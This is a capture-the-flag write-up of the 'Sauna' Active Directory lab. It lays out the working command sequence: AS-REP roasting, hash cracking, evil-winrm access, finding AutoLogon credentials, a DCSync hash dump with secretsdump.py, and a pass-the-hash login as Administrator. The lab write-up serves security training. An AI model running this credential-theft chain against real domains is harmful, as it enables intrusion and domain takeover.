# Sauna - Active Directory Lab

Date: 2024-11-09

---

## Scope

The target is an Active Directory environment with the hostname `sauna.htb` and IP `10.10.10.175`. I stored the target IP in a local file for reference:

```bash
echo 10.10.10.175 > target
```

Additionally, I added the following entry to the /etc/hosts file:

```bash
10.10.10.175 sauna.htb
```

---

## Enumeration

### 1. Full Port Scan

To discover all open ports on the target, I performed a full port scan:

```bash
nmap -p- -v -oN nmap/full_scan.sauna.txt 10.10.10.175
```

```
Open Ports Identified:

PORT      STATE SERVICE
53/tcp    open  domain
80/tcp    open  http
88/tcp    open  kerberos-sec
135/tcp   open  msrpc
139/tcp   open  netbios-ssn
389/tcp   open  ldap
445/tcp   open  microsoft-ds
464/tcp   open  kpasswd5
593/tcp   open  http-rpc-epmap
636/tcp   open  ldapssl
3268/tcp  open  globalcatLDAP
3269/tcp  open  globalcatLDAPssl
5985/tcp  open  wsman
9389/tcp  open  adws
49667/tcp open  unknown
49673/tcp open  unknown
49674/tcp open  unknown
49677/tcp open  unknown
49698/tcp open  unknown
49720/tcp open  unknown
```

### 2. Service Enumeration

I conducted a detailed scan of the identified ports to gather more information:

```bash
nmap -p53,80,88,135,139,389,445,464,593,636,3268,3269,5985,9389,49667,49673,49674,49677,49698,49720 -A -T4 -v -oN nmap/tcp_ports_scan.sauna.txt -oX nmap/tcp_ports_scan.sauna.xml 10.10.10.175
```

Key Findings:

* OS: **Windows Server 2019**
* Domain: **EGOTISTICAL-BANK.LOCAL**
* Hostname: **SAUNA**

Notable Services:

* Kerberos (88/tcp)
* LDAP (389/tcp, 3268/tcp)
* HTTP (80/tcp) with IIS 10.0 hosting "Egotistical Bank"
* SMB (139/tcp, 445/tcp)
* WinRM (5985/tcp)

---

### HTTP Exploration

The HTTP service revealed a basic web page hosted on Microsoft IIS. I explored two pages:

* http://sauna.htb/single.html: Found usernames. Stored them in a file called users.
* http://sauna.htb/about.html: Identified team members and added them to the users file.

![image](https://github.com/user-attachments/assets/192dc48b-2e61-4809-bf0a-1d4cc842748b)

---

### LDAP Enumeration

1. General Queries

LDAP allowed **unauthenticated queries**. Running the following:

```bash
ldapsearch -H ldap://$(cat target):389/ -x -s base -x "(objectClass=*)" "*"
```

Findings:

* `rootDomainNamingContext: DC=EGOTISTICAL-BANK,DC=LOCAL`
* `Server Name: CN=SAUNA,CN=Servers,CN=Default-First-Site-Name,CN=Sites,CN=Configuration,DC=EGOTISTICAL-BANK,DC=LOCAL`

2. Password Policy

Queried password policy with:

```bash
ldapsearch -H ldap://$(cat target):389/ -x -b 'DC=EGOTISTICAL-BANK,DC=LOCAL' "(objectClass=domain)" | grep Pwd
```

Result: Minimum password length is 7 characters.

---

### SMB Enumeration

SMB required authentication and could not be enumerated anonymously.

---

## Exploitation

### 1. User Enumeration and AS-REP Roasting

Using usernames from earlier, I created a custom username wordlist ([GitHub - CustListler](https://github.com/spread0942/CustListler)). Then, I used `GetNPUsers.py` to identify accounts vulnerable to AS-REP Roasting:

```bash
GetNPUsers.py EGOTISTICAL-BANK.LOCAL/ -usersfile users -format hashcat -outputfile ASREProastables.txt -dc-ip 10.10.10.175
```

Result: Found an **AS-REP hash** for user `fSmith`.

### 2. Cracking the Hash

Cracked the AS-REP hash using hashcat:

```bash
hashcat -m 18200 ASREProastables.txt /usr/share/wordlists/rockyou.txt
```

### 3. Access via WinRM

Using the cracked credentials, I accessed the machine with evil-winrm:

```bash
evil-winrm -i 10.10.10.175 -u "fSmith" -p "****"
```

Outcome: Retrieved the user flag.

---

## Privilege Escalation

### 1. BloodHound Enumeration

I used bloodhound-python for privilege escalation analysis:

```bash
mkdir loots && cd loots
bloodhound-python -d EGOTISTICAL-BANK.LOCAL -u "fSmith" -p "****" -ns 10.10.10.175 -c all
```

Findings: No significant paths for privilege escalation.

### 2. AutoLogon Credentials

Ran `winPEAS` and found AutoLogon credentials:

```
DefaultDomainName: EGOTISTICALBANK
DefaultUserName: EGOTISTICALBANK\svc_loanmgr
DefaultPassword: **********************
```

### 3. DCSync Attack

I marked as owned `svc_loanmgr` user on BloodHound and identified the possibility of a **DCSync attack**. 

![image](https://github.com/user-attachments/assets/98f799be-9037-41df-9160-aed2d7587659)

Using `secretsdump.py`, I dumped NTDS hashes:

```bash
secretsdump.py EGOTISTICAL-BANK/svc_loanmgr:"**********************"@10.10.10.175
```

Extracted Hashes:

```
Administrator NTLM Hash: aad3b.......:82345..........bdf86c7f98e
```

Using crackmapexec I confirmed the hash:

![image](https://github.com/user-attachments/assets/882612c7-4890-43dc-85f3-07cbda3bbd35)


## 4. Final Access

Used the administrator hash to log in via evil-winrm:

```bash
evil-winrm -i 10.10.10.175 -u "Administrator" -H "aad3b.......:82345..........bdf86c7f98e"
```

Outcome: Retrieved the root flag.

---

## Summary

1. Enumerated services and discovered users via HTTP and LDAP.
2. Exploited Kerberos AS-REP Roasting to gain initial access.
3. Used winPEAS to find AutoLogon credentials for privilege escalation.
4. Conducted a DCSync attack to dump NTDS hashes.
5. Logged in as the Administrator and retrieved both user and root flags.

---



